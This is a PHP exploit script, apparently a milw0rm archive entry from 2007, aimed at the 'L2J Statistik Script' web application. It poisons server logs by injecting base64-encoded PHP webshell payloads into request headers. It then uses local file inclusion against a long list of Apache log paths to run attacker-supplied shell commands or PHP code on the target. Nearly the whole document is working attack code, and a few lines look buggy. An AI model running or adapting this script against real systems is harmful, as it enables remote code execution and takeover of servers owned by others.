@@ -1,0 +1,290 @@
+<?
+
+print '
+ |    ___ \      | \ \        /    |             ____|            |      _) |   
+ |       ) |     |  \ \  \   / _ \ __ \          __| \ \  / __ \  |  _ \  | __| 
+ |      __/  \   |   \ \  \ /  __/ |   | _____|  |    `  <  |   | | (   | | |   
+_____|_____|\___/     \_/\_/ \___|_.__/         _____|_/\_\ .__/ _|\___/ _|\__| 
+                                                           _|                   
+				 __ )\ \   / 
+				 __ \ \   /  
+				 |   |   |   
+				____/   _|   
+          
+		  ___|           |      |                    |    
+		 |      _ \   _` |  _ \ __ \   __| _ \  _` | |  / 
+		 |     (   | (   |  __/ |   | |    __/ (   |   <  
+		\____|\___/ \__,_|\___|_.__/ _|  \___|\__,_|_|\_\  Rev.4
+
+	
+		~ [ www.codebreak.tk - codebreak1984@gmail.com] ~
+ 
+
+ 		  Application: L2J Statistik Script  <= v0.09
+
+	 	works with register_globals=On & magic_quotes=off
+
+
+Exploit by: Codebreak (a.k.a Chico)
+Contact: codebreak1984@gmail.com
+';
+
+if ($argc<5) {
+print_r('
+-----------------------------------------------------------------------------
+Usage: php '.$argv[0].' -type host path cmd
+type:
+ -shell    Execute shell commands.
+ -php      Execute PHP code.
+host:      target server (ip or hostname)
+path:      Statistik Script path
+cmd:       shell command (ls -la, dir, etc..) or php code.
+Options:
+ -p[port]:    specify a port (default 80)
+ -P[ip:port]: specify a proxy:port
+Example:
+ '.$argv[0].' -type www.l2jserver.com / ls -la -P1.1.1.1:80
+ '.$argv[0].' -type www.gamingsite.com /lineage2/ dir
+-----------------------------------------------------------------------------
+');
+
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacket($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$cb=$argv[1];
+$host=$argv[2];
+$path=$argv[3];
+$cmd="";
+
+$port=80;
+$proxy="";
+for ($i=4; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+if ($cb=="-php")
+{
+$plop = "php";
+$breaker = base64_decode("PD9waHAgb2JfY2xlYW4oKTsgZWNobyhjb2RlYnJlYWspOyBpbmlfc2V0KG1heF9leGVjdXRpb25fdGltZSwwKTsgaWYoaXNzZXQoJF9TRVJWRVJbSFRUUF9IT0xBXSkpeyAgICRwaHAgPSBnZXRfbWFnaWNfcXVvdGVzX2dwYygpPyBzdHJpcHNsYXNoZXMoJF9TRVJWRVJbSFRUUF9IT0xBXSk6JF9TRVJWRVJbSFRUUF9IT0xBXTsgZXZhbCgkcGhwLlwiO1wiKTsgfSBkaWU7ID8+");
+}
+if ($cb=="-shell")
+{
+$plop = "shell";
+$breaker = base64_decode("PD9waHAgb2JfY2xlYW4oKTsgZWNobyhjb2RlYnJlYWspO2luaV9zZXQobWF4X2V4ZWN1dGlvbl90aW1lLDApOyBwYXNzdGhydSgkX1NFUlZFUltIVFRQX0hPTEFdKTsgZGllOyA/Pg==");
+}
+echo "Poisoning Files ...\r\n\r\n";
+
+
+$p3="".$p2."index.php?page=".$breaker."";
+
+$packet="GET ".$p3.$breaker." HTTP/1.0\r\n";
+$packet.="User-Agent: ".$breaker." Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: close\r\n\r\n";
+sendpacket($packet);
+sleep(3);
+
+echo "Searching vulnerable files ...\n";
+$packet ="POST ".$p."/index.php?page=stat.php&step=clan&search=".$breaker." HTTP/1.0\r\n";
+$packet.="User-Agent: ".$breaker."\r\n";
+$packet.="CLIENT-IP: ".$breaker."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacket($packet);
+if (strstr($html,"codebreak"))
+{
+$temp=explode("codebreak",$html);
+die($temp[1]);
+}
+
+
+
+echo "";
+$pakiet="GET ".$p.$breaker." HTTP/1.1\r\n";
+$packet.="HOLA: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacket($packet);
+sleep(1);
+
+$paths= array (
+"access.log"
+);
+
+for ($i=0; $i<=count($paths)-1; $i++)
+{
+$a=$i+2;
+echo "";
+$packet ="GET ".$p."index.php?page=../".$paths[$i]." HTTP/1.1\r\n";
+$packet.="HOLA: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacket($packet);
+if (strstr($html,"codebreak"))
+{
+$temp=explode("codebreak",$html);
+die($temp[1]);
+}
+}
+$include= array (
+"index.php"
+);
+
+
+$paths= array (
+"../../../../../../usr/local/Apache2/logs/error.log",
+"../../../../../../usr/local/Apache2/logs/access.log",
+"../../../../../var/log/httpd/access_log",
+"../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../etc/httpd/logs/access_log",
+"../../../../../etc/httpd/logs/access.log",
+"../../../../../etc/httpd/logs/error_log",
+"../../../../../etc/httpd/logs/error.log",
+"../../../../../var/www/logs/access_log",
+"../../../../../var/www/logs/access.log",
+"../../../../../usr/local/apache/logs/access_log",
+"../../../../../usr/local/apache/logs/access.log",
+"../../../../../var/log/apache/access_log",
+"../../../../../var/log/apache/access.log",
+"../../../../../var/log/access_log",
+"../../../../../var/www/logs/error_log",
+"../../../../../var/www/logs/error.log",
+"../../../../../usr/local/apache/logs/error_log",
+"../../../../../usr/local/apache/logs/error.log",
+"../../../../../var/log/apache/error_log",
+"../../../../../var/log/apache/error.log",
+"../../../../../usr/local/apache2/logs/access_log",
+"../../../../../usr/local/apache2/logs/access.log",
+"../../../../../var/log/apache2/access_log",
+"../../../../../var/log/apache2/access.log",
+"../../../../../usr/local/apache2/logs/error_log",
+"../../../../../usr/local/apache2/logs/error.log",
+"../../../../../var/log/apache2/error_log",
+"../../../../../var/log/apache2/error.log",
+"../../../../../var/log/access_log",
+"../../../../../var/log/error_log"
+);
+
+for ($i=0; $i<=count($paths)-1; $i++)
+for ($l=0; $l<=count($include)-1; $l++)
+{
+{
+$b=$l+2;
+echo " Poisoned file?...[".$plop."]\n";
+$packet ="GET ".$p."".$include[$l]."?page=".$paths[$i]." HTTP/1.1\r\n";
+$packet.="HOLA: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacket($packet);
+
+if (strstr($html,"codebreak"))
+{
+echo "\r\n\r\n\r\n\r\nExploit succeeded....\r\n\r\n\r\n\r\n";
+$temp=explode("codebreak",$html);
+die($temp[1]);
+}
+}
+}
+echo "Exploit Failed. Possibly register_globals off or magic_quotes on\r\n";
+echo "codebreak1984@gmail.com\r\n";
+echo "www.codebreak.tk\r\n";
+
+// Based in Kacper LFI codes.
+?>
+
+# milw0rm.com [2007-01-07]
